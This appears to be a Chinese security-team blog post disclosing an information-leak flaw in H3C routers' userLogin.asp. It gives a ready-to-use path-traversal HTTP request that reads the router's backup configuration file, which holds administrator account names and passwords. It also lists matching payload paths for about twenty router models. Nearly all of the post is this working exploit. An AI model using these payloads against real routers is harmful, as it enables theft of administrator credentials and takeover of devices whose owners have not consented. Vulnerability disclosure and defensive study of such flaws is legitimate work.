#  ​H3C路由器 userLogin.asp 信息泄漏漏洞   
原创 R0seK1ller  蟹堡安全团队   2024-08-02 22:41  
  
# 1. 漏洞描述  
  
	  
     H3C路由器多系列存在信息泄露漏洞，攻击者可以利用该漏洞获取备份文件中的管理员账户及密码等敏感信息  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/yva8EEPh2zUcr0ib9h7OSEfxqyFzVgPt5eQr280sZtniama7Jp3ibOkvzmwAxdv1blm5KTMRTl8ATk7KhDUv24nMQ/640?wx_fmt=png&from=appmsg "")  
## 2. 漏洞复现  
```
GET /userLogin.asp/../actionpolicy_status/../GR2200.cfg HTTP/1.1
Host: X.X.X.X
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.199 Safari/537.36
Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Connection: close
```  
```
```  
  
	  
    payload 中待读取的 .cfg 名与路由器型号有关，只要将名字改成对应型号名就可以了。  
```
/userLogin.asp/../actionpolicy_status/../ER8300G2.cfg
/userLogin.asp/../actionpolicy_status/../M60.cfg
/userLogin.asp/../actionpolicy_status/../GR8300.cfg
/userLogin.asp/../actionpolicy_status/../GR5200.cfg
/userLogin.asp/../actionpolicy_status/../GR3200.cfg
/userLogin.asp/../actionpolicy_status/../GR2200.cfg
/userLogin.asp/../actionpolicy_status/../ER8300G2-X.cfg
/userLogin.asp/../actionpolicy_status/../ER8300G2.cfg
/userLogin.asp/../actionpolicy_status/../ER6300G2.cfg
/userLogin.asp/../actionpolicy_status/../ER5200G2.cfg
/userLogin.asp/../actionpolicy_status/../ER5200.cfg
/userLogin.asp/../actionpolicy_status/../ER5100.cfg
/userLogin.asp/../actionpolicy_status/../ER3260G2.cfg
/userLogin.asp/../actionpolicy_status/../ER3260.cfg
/userLogin.asp/../actionpolicy_status/../ER3200G2.cfg
/userLogin.asp/../actionpolicy_status/../ER3200.cfg
/userLogin.asp/../actionpolicy_status/../ER3108GW.cfg
/userLogin.asp/../actionpolicy_status/../ER3108G.cfg
/userLogin.asp/../actionpolicy_status/../ER3100G2.cfg
/userLogin.asp/../actionpolicy_status/../ER3100.cfg
/userLogin.asp/../actionpolicy_status/../ER2200G2.cfg

...

```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/yva8EEPh2zUcr0ib9h7OSEfxqyFzVgPt55V7wFliaQXc5glxRJQVuQz7e4kcLeba6mo8ia8A8O3RibttIIYyYSsZWg/640?wx_fmt=png&from=appmsg "")  
  
